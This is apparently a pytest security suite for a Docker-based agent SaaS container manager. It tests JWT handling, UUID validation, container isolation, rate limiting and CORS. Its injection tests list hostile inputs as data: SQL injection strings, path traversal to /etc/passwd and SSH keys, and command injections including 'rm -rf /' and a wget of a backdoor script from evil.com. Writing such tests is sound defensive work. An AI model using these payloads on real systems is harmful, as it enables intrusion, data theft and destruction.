"""
Security Tests for CLI-Agent SaaS Infrastructure (Container Manager)

Tests JWT authentication, UUID validation, injection prevention, rate limiting,
and container isolation for the NEW docker-agents SaaS architecture.

Target: api/container_manager.py (NOT session manager - that's old architecture)
"""

import asyncio
import os
from datetime import datetime

import docker
import httpx
import jwt
import pytest

# Configuration
MANAGER_URL = os.getenv("MANAGER_URL", "http://localhost:8080")
JWT_SECRET = None  # Will be loaded from container manager
TEST_UUID_VALID = "550e8400-e29b-41d4-a716-446655440000"  # Valid UUID v4


class TestJWTAuthentication:
    """Test JWT token generation, validation, and security"""

    @pytest.fixture(autouse=True)
    async def setup(self):
        """Setup test client"""
        self.client = httpx.AsyncClient(timeout=30.0)
        yield
        await self.client.aclose()

    async def _get_valid_token(self, uuid: str = TEST_UUID_VALID) -> str:
        """Helper to get a valid JWT token from /auth/login"""
        response = await self.client.post(
            f"{MANAGER_URL}/auth/login",
            json={"uuid": uuid, "email": "test@example.com"}
        )
        assert response.status_code == 200
        data = response.json()
        assert data["status"] == "success"
        return data["token"]

    @pytest.mark.asyncio
    async def test_valid_token_acceptance(self):
        """Valid JWT token should be accepted"""
        token = await self._get_valid_token()

        # Use token to access protected endpoint
        response = await self.client.get(
            f"{MANAGER_URL}/discover",
            headers={"Authorization": f"Bearer {token}"}
        )

        assert response.status_code == 200
        data = response.json()
        assert data["status"] == "success"
        assert "container_name" in data

    @pytest.mark.asyncio
    async def test_missing_token_rejected(self):
        """Request without token should return 401"""
        response = await self.client.get(f"{MANAGER_URL}/discover")

        assert response.status_code == 401
        data = response.json()
        assert data["status"] == "error"
        assert "authentication" in data["error"].lower() or "token" in data["error"].lower()

    @pytest.mark.asyncio
    async def test_invalid_token_rejected(self):
        """Malformed/invalid token should return 401"""
        response = await self.client.get(
            f"{MANAGER_URL}/discover",
            headers={"Authorization": "Bearer invalid.token.here"}
        )

        assert response.status_code == 401
        data = response.json()
        assert data["status"] == "error"

    @pytest.mark.asyncio
    async def test_expired_token_rejected(self):
        """Expired JWT token should be rejected"""
        # Create an expired token (if we have access to JWT_SECRET)
        # For now, test that a token from 25+ hours ago would be rejected
        # This requires either:
        # 1. Mocking time (complex)
        # 2. Creating token with past expiration (needs JWT_SECRET)
        # 3. Testing token age tracking (manual test)

        # Manual test: Create token, wait 24+ hours, verify rejection
        # For automated test, we'll verify the token has exp claim
        token = await self._get_valid_token()

        # Decode without verification to check structure
        decoded = jwt.decode(token, options={"verify_signature": False})
        assert "exp" in decoded
        assert "uuid" in decoded

        # Verify expiration is set to ~24 hours from now
        exp_time = datetime.fromtimestamp(decoded["exp"])
        now = datetime.now()
        time_diff = (exp_time - now).total_seconds()

        # Should be close to 24 hours (86400 seconds), allow 1 hour variance
        assert 82800 < time_diff < 90000, f"Expiration time is {time_diff}s, expected ~86400s"

    @pytest.mark.asyncio
    async def test_tampered_token_rejected(self):
        """Tampered JWT token should fail signature verification"""
        token = await self._get_valid_token()

        # Tamper with the token by changing a character in the payload section
        parts = token.split('.')
        # Modify middle section (payload)
        tampered_payload = parts[1][:-1] + ('A' if parts[1][-1] != 'A' else 'B')
        tampered_token = f"{parts[0]}.{tampered_payload}.{parts[2]}"

        response = await self.client.get(
            f"{MANAGER_URL}/discover",
            headers={"Authorization": f"Bearer {tampered_token}"}
        )

        assert response.status_code == 401
        data = response.json()
        assert data["status"] == "error"


class TestUUIDValidation:
    """Test UUID validation and injection prevention"""

    @pytest.fixture(autouse=True)
    async def setup(self):
        """Setup test client"""
        self.client = httpx.AsyncClient(timeout=30.0)
        yield
        await self.client.aclose()

    @pytest.mark.asyncio
    async def test_valid_uuid_accepted(self):
        """Valid UUID v4 should be accepted"""
        valid_uuids = [
            "550e8400-e29b-41d4-a716-446655440000",
            "7c9e6679-7425-40de-944b-e07fc1f90ae7",
            "f47ac10b-58cc-4372-a567-0e02b2c3d479"
        ]

        for uuid in valid_uuids:
            response = await self.client.post(
                f"{MANAGER_URL}/auth/login",
                json={"uuid": uuid}
            )
            assert response.status_code == 200
            data = response.json()
            assert data["status"] == "success"

    @pytest.mark.asyncio
    async def test_sql_injection_blocked(self):
        """SQL injection attempts in UUID should be blocked"""
        sql_payloads = [
            "' OR '1'='1",
            "1' UNION SELECT * FROM containers--",
            "'; DROP TABLE containers;--",
            "admin'--",
            "1' OR 1=1--"
        ]

        for payload in sql_payloads:
            response = await self.client.post(
                f"{MANAGER_URL}/auth/login",
                json={"uuid": payload}
            )
            # Should reject with 400 (bad request) or 401 (unauthorized)
            assert response.status_code in [400, 401, 422]
            data = response.json()
            assert data["status"] == "error"

    @pytest.mark.asyncio
    async def test_path_traversal_blocked(self):
        """Path traversal attempts in UUID should be blocked"""
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "../../../../../../root/.ssh/id_rsa"
        ]

        for payload in path_payloads:
            response = await self.client.post(
                f"{MANAGER_URL}/auth/login",
                json={"uuid": payload}
            )
            assert response.status_code in [400, 401, 422]
            data = response.json()
            assert data["status"] == "error"

    @pytest.mark.asyncio
    async def test_command_injection_blocked(self):
        """Command injection attempts in UUID should be blocked"""
        cmd_payloads = [
            "; ls -la /",
            "| cat /etc/passwd",
            "`whoami`",
            "$(whoami)",
            "&& rm -rf /",
            "; wget http://evil.com/backdoor.sh |"
        ]

        for payload in cmd_payloads:
            response = await self.client.post(
                f"{MANAGER_URL}/auth/login",
                json={"uuid": payload}
            )
            assert response.status_code in [400, 401, 422]
            data = response.json()
            assert data["status"] == "error"

    @pytest.mark.asyncio
    async def test_uuid_length_limit_enforced(self):
        """UUID length should be limited to prevent buffer overflow"""
        # UUID v4 is exactly 36 characters (32 hex + 4 hyphens)
        # Test exceeding max length
        long_uuid = "550e8400-e29b-41d4-a716-446655440000" + "x" * 100

        response = await self.client.post(
            f"{MANAGER_URL}/auth/login",
            json={"uuid": long_uuid}
        )
        assert response.status_code in [400, 401, 422]
        data = response.json()
        assert data["status"] == "error"


class TestContainerIsolation:
    """Test container isolation (network, filesystem, process)"""

    @pytest.fixture(autouse=True)
    def setup(self):
        """Setup Docker client"""
        self.docker_client = docker.from_env()
        yield
        # Cleanup handled by container manager

    @pytest.mark.asyncio
    async def test_network_isolation_between_users(self):
        """Containers for different users should be on isolated networks"""
        # Create two containers for different UUIDs
        uuid1 = "550e8400-e29b-41d4-a716-446655440000"
        uuid2 = "7c9e6679-7425-40de-944b-e07fc1f90ae7"

        async with httpx.AsyncClient(timeout=30.0) as client:
            # Get tokens for both users
            resp1 = await client.post(f"{MANAGER_URL}/auth/login", json={"uuid": uuid1})
            token1 = resp1.json()["token"]

            resp2 = await client.post(f"{MANAGER_URL}/auth/login", json={"uuid": uuid2})
            token2 = resp2.json()["token"]

            # Trigger container creation for both
            await client.get(
                f"{MANAGER_URL}/discover",
                headers={"Authorization": f"Bearer {token1}"}
            )
            await client.get(
                f"{MANAGER_URL}/discover",
                headers={"Authorization": f"Bearer {token2}"}
            )

        # Wait for containers to be created
        await asyncio.sleep(3)

        # Find the containers
        containers = self.docker_client.containers.list(filters={"name": "cli-agent-"})
        user_containers = [c for c in containers if uuid1[:8] in c.name or uuid2[:8] in c.name]

        if len(user_containers) >= 2:
            # Verify they're on different networks
            net1 = list(user_containers[0].attrs['NetworkSettings']['Networks'].keys())
            net2 = list(user_containers[1].attrs['NetworkSettings']['Networks'].keys())

            # Should have user-specific networks
            user_nets = [n for n in net1 + net2 if 'cli-agent-user-' in n]
            assert len(set(user_nets)) >= 2, "Users should have isolated networks"

    def test_filesystem_isolation(self):
        """Containers should have isolated filesystems via volumes"""
        # Get list of volumes
        volumes = self.docker_client.volumes.list(filters={"label": "cli-agent-user"})

        # Volumes should be labeled with UUIDs for isolation
        for volume in volumes:
            labels = volume.attrs.get('Labels', {})
            assert 'cli-agent-user' in labels or 'uuid' in labels

    def test_capability_restrictions(self):
        """Containers should run with dropped capabilities"""
        containers = self.docker_client.containers.list(filters={"name": "cli-agent-backend"})

        if containers:
            container = containers[0]
            host_config = container.attrs['HostConfig']

            # Should have CapDrop set
            cap_drop = host_config.get('CapDrop', [])
            assert 'ALL' in cap_drop or len(cap_drop) > 0, "Capabilities should be dropped"

            # Should have SecurityOpt with no-new-privileges
            security_opt = host_config.get('SecurityOpt', [])
            assert any('no-new-privileges' in opt for opt in security_opt), \
                "no-new-privileges should be set"


class TestRateLimiting:
    """Test rate limiting enforcement (100 req/min per user)"""

    @pytest.fixture(autouse=True)
    async def setup(self):
        """Setup test client"""
        self.client = httpx.AsyncClient(timeout=30.0)
        yield
        await self.client.aclose()

    @pytest.mark.asyncio
    async def test_rate_limit_enforcement(self):
        """Should enforce 100 requests per 60 seconds per user"""
        # Get a valid token
        response = await self.client.post(
            f"{MANAGER_URL}/auth/login",
            json={"uuid": TEST_UUID_VALID}
        )
        token = response.json()["token"]

        # Send requests rapidly
        headers = {"Authorization": f"Bearer {token}"}
        responses = []

        # Send 120 requests (should hit limit at 100)
        for i in range(120):
            resp = await self.client.get(f"{MANAGER_URL}/discover", headers=headers)
            responses.append(resp.status_code)
            if resp.status_code == 429:
                break  # Rate limited

        # Should get at least one 429 (Too Many Requests)
        assert 429 in responses, "Rate limiting should trigger at 100 req/min"

        # Count how many succeeded before rate limit
        success_count = responses.count(200)
        assert success_count <= 100, f"Too many requests allowed: {success_count}"

    @pytest.mark.asyncio
    async def test_rate_limit_per_user_isolation(self):
        """Rate limits should be per-user, not global"""
        uuid1 = "550e8400-e29b-41d4-a716-446655440000"
        uuid2 = "7c9e6679-7425-40de-944b-e07fc1f90ae7"

        # Get tokens for both users
        resp1 = await self.client.post(f"{MANAGER_URL}/auth/login", json={"uuid": uuid1})
        token1 = resp1.json()["token"]

        resp2 = await self.client.post(f"{MANAGER_URL}/auth/login", json={"uuid": uuid2})
        token2 = resp2.json()["token"]

        # Send 60 requests for user1
        for _ in range(60):
            await self.client.get(
                f"{MANAGER_URL}/discover",
                headers={"Authorization": f"Bearer {token1}"}
            )

        # User2 should still be able to make requests (separate rate limit)
        response = await self.client.get(
            f"{MANAGER_URL}/discover",
            headers={"Authorization": f"Bearer {token2}"}
        )

        assert response.status_code == 200, "User2 should not be rate limited by user1's requests"


class TestCORSSecurity:
    """Test CORS configuration security"""

    @pytest.fixture(autouse=True)
    async def setup(self):
        """Setup test client"""
        self.client = httpx.AsyncClient(timeout=30.0)
        yield
        await self.client.aclose()

    @pytest.mark.asyncio
    async def test_cors_headers_present(self):
        """CORS headers should be present on responses"""
        response = await self.client.options(f"{MANAGER_URL}/health")

        # Should have CORS headers
        assert "access-control-allow-origin" in response.headers or \
               "Access-Control-Allow-Origin" in response.headers

    @pytest.mark.asyncio
    async def test_production_cors_not_wildcard(self):
        """Production environment should not use wildcard CORS"""
        # Check health endpoint for CORS header
        response = await self.client.get(f"{MANAGER_URL}/health")

        # If environment is production, CORS should not be *
        env = os.getenv("ENVIRONMENT", "production")
        if env == "production":
            cors_header = response.headers.get("Access-Control-Allow-Origin", "")
            assert cors_header != "*", "Production should not use wildcard CORS"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
